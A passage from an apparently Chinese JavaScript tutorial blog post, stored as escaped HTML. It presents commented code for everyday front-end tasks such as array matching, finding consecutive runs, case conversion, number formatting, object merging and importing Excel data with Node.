bash\"\u003e\u003ccode\u003e//准备临时数组\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e compareArr(arr1,arr2){\n    var result=[],arr;\n    //遍历\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(var i=0;i\u0026lt;arr1.length;i++){\n        //根据arr1[i]的值，查找arrayB，如果arr2中的有满足条件（arrayB中的对象，有key值等于arrayA[i]）的项，就会返回满足条件的项，否则返回underfind;\n        arr=arr2.find(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(val){\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e val.key===arr1[i]});\n        //如果arr不是undefind，就会添加arr，否则添加{key:arrayA[i],num1:\u003cspan class=\"hljs-string\"\u003e'0'\u003c/span\u003e,num2:\u003cspan class=\"hljs-string\"\u003e'0'\u003c/span\u003e,num3:\u003cspan class=\"hljs-string\"\u003e'0'\u003c/span\u003e,tot:\u003cspan class=\"hljs-string\"\u003e'0'\u003c/span\u003e}。\n        arr?result.push(arr):result.push({key:arrayA[i],num1:\u003cspan class=\"hljs-string\"\u003e'0'\u003c/span\u003e,num2:\u003cspan class=\"hljs-string\"\u003e'0'\u003c/span\u003e,num3:\u003cspan class=\"hljs-string\"\u003e'0'\u003c/span\u003e,tot:\u003cspan class=\"hljs-string\"\u003e'0'\u003c/span\u003e});\n    }\n}\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e测试\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar arrayA = [\u003cspan class=\"hljs-string\"\u003e'b'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'c'\u003c/span\u003e];\nvar arrayB = [{\n    key:\u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e,\n    num1:\u003cspan class=\"hljs-string\"\u003e'1'\u003c/span\u003e,\n    num2:\u003cspan class=\"hljs-string\"\u003e'2'\u003c/span\u003e,\n    num3:\u003cspan class=\"hljs-string\"\u003e'3'\u003c/span\u003e,\n    tot:\u003cspan class=\"hljs-string\"\u003e'6'\u003c/span\u003e\n},{\n    key:\u003cspan class=\"hljs-string\"\u003e'b'\u003c/span\u003e,\n    num1:\u003cspan class=\"hljs-string\"\u003e'11'\u003c/span\u003e,\n    num2:\u003cspan class=\"hljs-string\"\u003e'22'\u003c/span\u003e,\n    num3:\u003cspan class=\"hljs-string\"\u003e'33'\u003c/span\u003e,\n    tot:\u003cspan class=\"hljs-string\"\u003e'66'\u003c/span\u003e\n},{\n    key: \u003cspan class=\"hljs-string\"\u003e'c'\u003c/span\u003e,\n    num1: \u003cspan class=\"hljs-string\"\u003e'111'\u003c/span\u003e,\n    num2: \u003cspan class=\"hljs-string\"\u003e'222'\u003c/span\u003e,\n    num3: \u003cspan class=\"hljs-string\"\u003e'333'\u003c/span\u003e,\n    tot:666\n}];\ncompareArr(arrayA,arrayB);\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607162f0ca86c7f?w=510\u0026amp;h=77\u0026amp;f=png\u0026amp;s=9224\"\u003e\u003c/p\u003e\u003ch2\u003e5.学院获奖\u003c/h2\u003e\u003cp\u003e统计学生申请优秀毕业生，并且符合条件的（成绩优秀，拿过奖学金，获得过三好学生）。前提是要申请\u003c/p\u003e\u003cp\u003e大概的流程图就是像下面这样！\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607162f3aaeffde?w=775\u0026amp;h=785\u0026amp;f=png\u0026amp;s=16255\"\u003e\u003c/p\u003e\u003cp\u003e我在代码上写上注释，相信不难理解了\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e//学生列表\n//isApply：是否有申请优秀毕业生\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e studentList = [\n    {\n        name: \u003cspan class=\"hljs-string\"\u003e'aa'\u003c/span\u003e,\n        isApply: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e,\n        id: 1\n    },\n    {\n        name: \u003cspan class=\"hljs-string\"\u003e'bb'\u003c/span\u003e,\n        isApply: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n        id: 2\n    },\n    {\n        name: \u003cspan class=\"hljs-string\"\u003e'cc'\u003c/span\u003e,\n        isApply: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n        id: 3\n    }\n];\n\n//申请优秀毕业生的学生 isApply:\u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e\n\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e _student = studentList.filter(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (item) {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e item.isApply;\n});\n//isExcellent:优秀学生的id列表\n//isScholarship:获得过奖学金的学生的id列表\n//isThreeGood:获得过三好学生的学生的id列表\n//accord:集合\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e isExcellent = [1, 2, 3, 4, 5], isScholarship = [4, 2, 5, 6, 2, 1, 2], isThreeGood = [2, 1, 4, 52, 36], accord = [];\n//数组去重函数\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e removeRepeatArr(arr) {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e arr.filter(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (item, index, self) {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e self.indexOf(item) === index;\n    });\n}\n\n//统计数组中，一个遇上元素的出现次数\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e getEleCount(obj, ele) {\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e num = 0;\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e i = 0, len = obj.length; i \u0026lt; len; i++) {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (ele === obj[i]) {\n            num++;\n        }\n    }\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e num;\n}\n\n//添加学生记录，把获得成绩优秀的学生的id，获得过奖学金的学生的id，获得过三好学生的id添加进去。\n//但是添加之前，要对获得成绩优秀的学生的id，获得过奖学金的学生的id，获得过三好学生的id。这个三个数组进行去重再添加进accord，因为一个学生可能不止一次成绩优秀，不止一次获得过奖学金，不止一次获得过三好学生\n//这样就方便下面的判断，只要学生的id在accord里面出现两次及以上就符合条件\naccord.push.apply(accord, removeRepeatArr(isExcellent));\naccord.push.apply(accord, removeRepeatArr(isScholarship));\naccord.push.apply(accord, removeRepeatArr(isThreeGood));\nconsole.log(accord);\n//符合条件的学生列表\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e accordStudent = [];\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e (\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e i = 0; i \u0026lt; _student.length; i++) {\n    //只要学生的id在accord里面出现两次及以上\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (getEleCount(accord, _student[i].id) \u0026gt;= 2) {\n        //记录哪些学生符合条件\n        accordStudent.push(_student[i]);\n    }\n}\nconsole.log(accordStudent);\n\u003c/code\u003e\u003c/pre\u003e\u003ch2\u003e6.数组连续的最大长度\u003c/h2\u003e\u003cp\u003e这个也是出于我回答过的问题：如下\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e//假如有一个数组，下面这个数组最大的连续长度就是4——————8,9,10,11\nvar arr=[1,2,4,5,6,8,9,10,11];\n\n//代码实现\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e countLen(arr){\n    //如果参数不是数组或者长度为0，直接返回0\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(arr.constructor!==Array||arr.length===0){\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 0;}\n    //首先进入当前连续长度nowLen设初始化为1，最大连续长度maxLen初始化为0\n    var nowLen=1,maxLen=0;\n    \n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(var i=1,len=arr.length;i\u0026lt;len;i++){\n        //当前数组元素是不是比上一个数组大1\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(arr[i]-arr[i-1]===1){\n            //如果是，当前连续长度nowLen+1    \n            nowLen++;\n        }\n        \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e{\n            //否则先判断，当前连续长度是否大于最大连续长度\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(maxLen\u0026lt;nowLen){\n                //如果是就赋值\n                maxLen=nowLen\n            }\n            //当前连续长度初始化为1\n            nowLen=1;\n        }\n    }\n    //循环完再判断一次当前连续长度是否大于最大连续长度（避免最大连续长度是数组最后面几个数组时产生的bug）\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(maxLen\u0026lt;nowLen){\n        maxLen=nowLen\n    }\n    //返回最大连续长度\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e maxLen;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607162f97c50979?w=409\u0026amp;h=81\u0026amp;f=png\u0026amp;s=5204\"\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607162f938e6dd4?w=383\u0026amp;h=78\u0026amp;f=png\u0026amp;s=2989\"\u003e\u003c/p\u003e\u003ch2\u003e7.答题连对数\u003c/h2\u003e\u003cp\u003e这个和上面的代码基本一样，只是判断条件毫厘之差，直接贴，大家看就好\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e countTrue(arr){debugger;\n    //如果参数不是数组或者长度为0，直接返回0\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(arr.constructor!==Array||arr.length===0){\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 0;}\n    //首先初始化连续答对长度nowLen为0，最大连续答对长度maxLen为0\n    var nowLen=0,maxLen=0;\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(var i=0,len=arr.length;i\u0026lt;len;i++){\n        //当前数组元素是不是比上一个数组大1\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(arr[i]){\n            //如果是，当前连续长度nowLen+1\n            nowLen++;\n        }\n        \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e{\n            //否则先判断，当前连续长度是否大于最大连续长度\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(maxLen\u0026lt;nowLen){\n                //如果是就赋值\n                maxLen=nowLen\n            }\n            //当前连续长度初始化为0\n            nowLen=0;\n        }\n    }\n    //循环完再判断一次当前连续长度是否大于最大连续长度（避免最大连续长度是数组最后面几个数组时产生的bug）\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(maxLen\u0026lt;nowLen){\n        maxLen=nowLen\n    }\n    //返回最大连续长度\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e maxLen;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607162fc1687c5d?w=555\u0026amp;h=116\u0026amp;f=png\u0026amp;s=6441\"\u003e\u003c/p\u003e\u003ch2\u003e8.命名方式转换\u003c/h2\u003e\u003cp\u003e比如驼峰命名方式转'-'命名方式。\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar str = \u003cspan class=\"hljs-string\"\u003e\"shouHou\"\u003c/span\u003e;\n//\u003cspan class=\"hljs-variable\"\u003e$1\u003c/span\u003e-第一个括号匹配的内容\n//这个实例，\u003cspan class=\"hljs-variable\"\u003e$1\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'H'\u003c/span\u003e\nstr = str.replace(/([A-Z])/g,\u003cspan class=\"hljs-string\"\u003e\"-\u003cspan class=\"hljs-variable\"\u003e$1\u003c/span\u003e\"\u003c/span\u003e).toLowerCase();\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071630133dcfdc?w=416\u0026amp;h=51\u0026amp;f=png\u0026amp;s=5206\"\u003e\u003c/p\u003e\u003cp\u003e比如'-'命名方式转驼峰命名方式\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar str=\u003cspan class=\"hljs-string\"\u003e\"shou-hou\"\u003c/span\u003e;\n//\u003cspan class=\"hljs-variable\"\u003e$0\u003c/span\u003e-匹配的结果   \u003cspan class=\"hljs-variable\"\u003e$1\u003c/span\u003e-第一个括号匹配的内容\n//这个实例\u003cspan class=\"hljs-variable\"\u003e$0\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'-h'\u003c/span\u003e    \u003cspan class=\"hljs-variable\"\u003e$1\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e'h'\u003c/span\u003e\nstr=str.replace(/-(\\w)/g,\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$0\u003c/span\u003e,\u003cspan class=\"hljs-variable\"\u003e$1\u003c/span\u003e){\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-variable\"\u003e$1\u003c/span\u003e.toUpperCase();\n}); \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071630109a0412?w=393\u0026amp;h=107\u0026amp;f=png\u0026amp;s=8192\"\u003e\u003c/p\u003e\u003ch2\u003e9.格式化字符\u003c/h2\u003e\u003cp\u003e这个最常见的就是在金额方面的显示需求上，比如后台返回10000。前端要显示成10,000或者其他格式等！\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e//str\n//size-每隔几个字符进行分割 默认3\n//delimiter-分割符 默认\u003cspan class=\"hljs-string\"\u003e','\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e formatText(str,size,delimiter){\n    var _str=str.toString();\n    var _size=size||3,_delimiter=delimiter||\u003cspan class=\"hljs-string\"\u003e','\u003c/span\u003e;\n    /* \n     如果_size是3\n     \u003cspan class=\"hljs-string\"\u003e\"\\d{1,3}(?=(\\d{3})+$)\"\u003c/span\u003e \n     */\n    var regText=\u003cspan class=\"hljs-string\"\u003e'\\\\d{1,'\u003c/span\u003e+_size+\u003cspan class=\"hljs-string\"\u003e'}(?=(\\\\d{'\u003c/span\u003e+_size+\u003cspan class=\"hljs-string\"\u003e'})+$)'\u003c/span\u003e;\n    /*   \n    /\\d{1,3}(?=(\\d{3})+$)/g     这个正则的意思：匹配连续的三个数字，但是这些三个数字不能是字符串的开头1-3个字符  \n     */\n    var reg=new RegExp(regText,\u003cspan class=\"hljs-string\"\u003e'g'\u003c/span\u003e);\n    /* \n    (-?) 匹配前面的-号   (\\d+)匹配中间的数字   ((\\.\\d+)?)匹配小数点后面的数字\n    //\u003cspan class=\"hljs-variable\"\u003e$0\u003c/span\u003e-匹配结果，\u003cspan class=\"hljs-variable\"\u003e$1\u003c/span\u003e-第一个括号返回的内容----(-?)    \u003cspan class=\"hljs-variable\"\u003e$2\u003c/span\u003e,\u003cspan class=\"hljs-variable\"\u003e$3\u003c/span\u003e如此类推  \n    */\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e _str.replace(/^(-?)(\\d+)((\\.\\d+)?)$/, \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (\u003cspan class=\"hljs-variable\"\u003e$0\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$1\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$2\u003c/span\u003e, \u003cspan class=\"hljs-variable\"\u003e$3\u003c/span\u003e) {\n          \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-variable\"\u003e$1\u003c/span\u003e + \u003cspan class=\"hljs-variable\"\u003e$2\u003c/span\u003e.replace(reg, \u003cspan class=\"hljs-string\"\u003e'$\u0026amp;,'\u003c/span\u003e) + \u003cspan class=\"hljs-variable\"\u003e$3\u003c/span\u003e;\n    })\n}\n\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071630326e0fee?w=422\u0026amp;h=186\u0026amp;f=png\u0026amp;s=20526\"\u003e\u003c/p\u003e\u003ch2\u003e10.对象合并，并且记录异常数据\u003c/h2\u003e\u003cp\u003e这个需求，可能大家有点懵。下面实例分析\u003cbr\u003e比如有两个都地方记录了我的信息\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e info1={\n        name:\u003cspan class=\"hljs-string\"\u003e\"守候\"\u003c/span\u003e,\n        sex:\u003cspan class=\"hljs-string\"\u003e\"男\"\u003c/span\u003e,\n        age:24,\n        job:\u003cspan class=\"hljs-string\"\u003e\"web前端\"\u003c/span\u003e\n    },info2={\n        name:\u003cspan class=\"hljs-string\"\u003e\"守候!\"\u003c/span\u003e,\n        country:\u003cspan class=\"hljs-string\"\u003e\"china\"\u003c/span\u003e,\n        interest:\u003cspan class=\"hljs-string\"\u003e\"basketball\"\u003c/span\u003e,\n        phone:\u003cspan class=\"hljs-string\"\u003e\"12345678910\"\u003c/span\u003e,\n        job:\u003cspan class=\"hljs-string\"\u003e\"web前端\"\u003c/span\u003e\n    }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e现在要合并我的信息，并且记录可能有异常的信息。比如上面的name属性，在两个对象都有，而且两个对象的值不一样，那么就不知道到底是info1中的name属性是正确的，还是info2中的name属性是正确的。所以，就得把name这个属性记录起来，方便以后核对name这个属性。\u003c/p\u003e\u003cp\u003e如下图\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/160716300ac749e8?w=538\u0026amp;h=150\u0026amp;f=png\u0026amp;s=13921\"\u003e\u003c/p\u003e\u003cp\u003e下面，一步一步来，先不管3721，直接合并属性\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e objAll={};\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e assignObj(objArr) {\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e _obj={};\n    \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e i=0;i\u0026lt;objArr.length;i++){\n        _obj=Object.assign(_obj,objArr[i],{});\n    }\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e JSON.parse(JSON.stringify(_obj));\n}\nobjAll=assignObj([objA,objB]); \u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后先准备一个字段，记录哪些异常信息\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003eobjAll.warnInfo=[];\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e最后检查对象，判断哪些信息有异常\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e  \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e checkObj(_objAll,objList) {\n        //获取所有属性\n        \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e _keys=Object.keys(_objAll);\n        \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e i=0;i\u0026lt;objList.length;i++){\n            \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e(\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e j=0;j\u0026lt;_keys.length;j++){\n                //如果_keys[j]这个属性，在objList[i]和_objAll里面都存在，而且这两个值是不一样的，那么就是一场数据，需要记录！\n                \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(objList[i][_keys[j]]!==undefined\u0026amp;\u0026amp;_objAll[_keys[j]]!==objList[i][_keys[j]]){\n                    _objAll.isError.push(_keys[j]);\n                }\n            }\n        }\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e _objAll;\n    }\n    console.log(checkObj(objAll,[objA,objB]));  \n     \n\u003c/code\u003e\u003c/pre\u003e\u003ch2\u003e11.筛选标签\u003c/h2\u003e\u003cp\u003e如下图，在下面渲染这个标签\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/1607163005707a87?w=447\u0026amp;h=53\u0026amp;f=png\u0026amp;s=3099\"\u003e\u003c/p\u003e\u003cp\u003e大家可能第一可能觉得压根没难度\u003cbr\u003e就是一个对象数组：比如\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar searchTag=[\n    {label:\u003cspan class=\"hljs-string\"\u003e'产品编码'\u003c/span\u003e,value:\u003cspan class=\"hljs-string\"\u003e'100072236-8'\u003c/span\u003e},\n    {label:\u003cspan class=\"hljs-string\"\u003e'产品名称'\u003c/span\u003e,value:\u003cspan class=\"hljs-string\"\u003e'甘油'\u003c/span\u003e}\n]\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e但是这样的数据，显然是要经过处理生成的\u003c/p\u003e\u003cp\u003e因为不可能这样发送请求\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003ehttp://example.com?产品编码=100072236-8\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e发送过去的参数应该是这样的\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003ehttp://example.com?proId=100072236-8\n\nvar searchParam={proId:\u003cspan class=\"hljs-string\"\u003e'100072236-8'\u003c/span\u003e,proName:\u003cspan class=\"hljs-string\"\u003e'甘油'\u003c/span\u003e}   \u003c/code\u003e\u003c/pre\u003e\u003cp\u003e怎么进行数据的处理呢，其实很简单，代码不打注释，我想都看得懂\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar searchTag=[];\nvar searchText={proId:\u003cspan class=\"hljs-string\"\u003e'产品编码'\u003c/span\u003e,proName:\u003cspan class=\"hljs-string\"\u003e'产品名称'\u003c/span\u003e};\nvar searchParam={proId:\u003cspan class=\"hljs-string\"\u003e'100072236-8'\u003c/span\u003e,proName:\u003cspan class=\"hljs-string\"\u003e'甘油'\u003c/span\u003e};\nObject.keys(searchParam).forEach(\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e (item) {\n    searchTag.push({\n        label:searchText[item],\n        key:item,\n        value:searchParam[item]\n    })\n})\nconsole.log(searchTag)    \n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071630438868f9?w=424\u0026amp;h=75\u0026amp;f=png\u0026amp;s=8538\"\u003e\u003c/p\u003e\u003cp\u003e有了这些数据，渲染到页面这个就简单了！\u003c/p\u003e\u003ch2\u003e12.导入excel内容\u003c/h2\u003e\u003cp\u003e就是excel上这样的内容\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/160716308aa34b59?w=365\u0026amp;h=331\u0026amp;f=png\u0026amp;s=9039\"\u003e\u003c/p\u003e\u003cp\u003e转成下面的数据\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/160716308ee554b8?w=337\u0026amp;h=206\u0026amp;f=png\u0026amp;s=7360\"\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071630906c2869?w=151\u0026amp;h=64\u0026amp;f=png\u0026amp;s=2299\"\u003e\u003c/p\u003e\u003cp\u003e目录如下\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071630907cb32c?w=375\u0026amp;h=281\u0026amp;f=png\u0026amp;s=14086\"\u003e\u003c/p\u003e\u003cp\u003e下面开始写代码，我们利用node.js来写\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e path = require(\u003cspan class=\"hljs-string\"\u003e'path'\u003c/span\u003e);\n//使用ejsexcel读取excel文件  npm install ejsexcel --save\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e ejsExcel=require(\u003cspan class=\"hljs-string\"\u003e'ejsexcel'\u003c/span\u003e);\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e fs=require(\u003cspan class=\"hljs-string\"\u003e'fs'\u003c/span\u003e);\n//读取excel\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e exBuf=fs.readFileSync(__dirname+\u003cspan class=\"hljs-string\"\u003e'/resource/userList.xlsx'\u003c/span\u003e);\n\u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e _data=[];\n//获取成功后\nejsExcel.getExcelArr(exBuf).then(exlJson=\u0026gt;{\n    //获取excel数据\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e workBook=exlJson;\n    //获取excel第一张表 sheet1\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e workSheets=workBook[0];\n    //导出js的路径\n    \u003cspan class=\"hljs-built_in\"\u003elet\u003c/span\u003e newfilepath=path.join(__dirname,\u003cspan class=\"hljs-string\"\u003e\"/resource/test.js\"\u003c/span\u003e);\n    //遍历第一张表的的每一行数据\n    workSheets.forEach((item,index)=\u0026gt;{\n        //从第二行开始插入，避免连表头也插入_data里面\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(index\u0026gt;0){\n            //往_data插入单元格个值，item[0]相当于excel中的姓名，item[1]就是excel中的联系电话\n            _data.push({\n                name:item[0],\n                phone:item[1]\n            })\n        }\n    });\n    //写入js文件\n    fs.writeFileSync(newfilepath, \u003cspan class=\"hljs-string\"\u003e'let _data='\u003c/span\u003e+JSON.stringify(_data)+\u003cspan class=\"hljs-string\"\u003e';export {_data}'\u003c/span\u003e);\n}).catch(error=\u0026gt;{\n    //打印获取失败信息\n    console.log(\u003cspan class=\"hljs-string\"\u003e\"读取错误!\"\u003c/span\u003e);\n    console.log(error);\n});\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后命令行执行该js\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e$ node importFile.js\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e然后就发现多了一个test.js文件\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/20/16071630c7ba133d?w=800\u0026amp;h=250\u0026amp;f=png\u0026amp;s=103382\"\u003e\u003c/p\u003e\u003cp\u003eexcel的数据就这样导入成js的一个数组了，只要引入这个数组，就可以正常的使用了！\u003c/p\u003e\u003ch2\u003e13.随机循环\u003c/h2\u003e\u003cp\u003e当时接到的业务是实际显示客户的信息，感觉有点像音乐播放器的随机循环。\u003c/p\u003e\u003cp\u003e要求有两个：\u003cbr\u003e1.一个提示列表里面，提示的信息每隔500ms随机展示。\u003cbr\u003e2.同一轮循环里面，一个提示信息只能展示一次。\u003cbr\u003e3.列表的提示信息全部展示完了，进行下一轮展示。\u003cbr\u003e这个逻辑没什么，直接在代码打上注释，我想大家就明白了！\u003c/p\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003evar tipList=[\u003cspan class=\"hljs-string\"\u003e'提示1'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'提示2'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'提示3'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'提示4'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'提示5'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'提示6'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'提示7'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'提示8'\u003c/span\u003e,\u003cspan class=\"hljs-string\"\u003e'提示9'\u003c/span\u003e];\nvar tipListShow=[];\ntipListShow=Object.assign([],tipList);\nvar i=0,timer=null;\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eplay\u003c/span\u003e\u003c/span\u003e() {\n    //随机显示一个，显示了之后，把这个项从tipListShow中删除掉，防止在同一轮重复出现！\n    console.log(tipListShow.splice(Math.floor(Math.random() * tipListShow.length),1)[0]);\n    //当循环完了之后，tipListShow的长度就会是0，然后就重新赋值，准备进行下一轮的随机循环\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e(tipListShow.length===0){\n        tipListShow=Object.assign([],tipList);\n        i=0;\n    }\n    //如果需要暂停或者停止的，清除这个定时器即可，下次执行就重新这样创建定时器，执行play();！\n    timer=\u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003eTimeout(\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efunction\u003c/span\u003e\u003c/span\u003e () {\n        play();\n    